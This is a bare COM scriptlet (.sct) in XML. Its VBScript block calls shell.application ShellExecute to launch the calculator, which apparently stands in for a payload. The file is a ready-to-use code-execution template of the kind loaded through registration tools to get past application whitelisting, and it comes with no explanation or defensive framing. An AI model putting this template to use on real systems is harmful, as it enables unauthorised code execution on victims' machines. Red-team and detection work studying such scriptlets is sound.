``` XML
<!-- <?XML version="1.0"?> -->
<scriptlet>
        <registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
                <script language="VBScript">
                        <![CDATA[Dim objResult
                        Set objShell = CreateObject("shell.application")
                        objResult = objShell.shellexecute("calc")
                        ]]>
                </script>
        </registration>
</scriptlet>
```
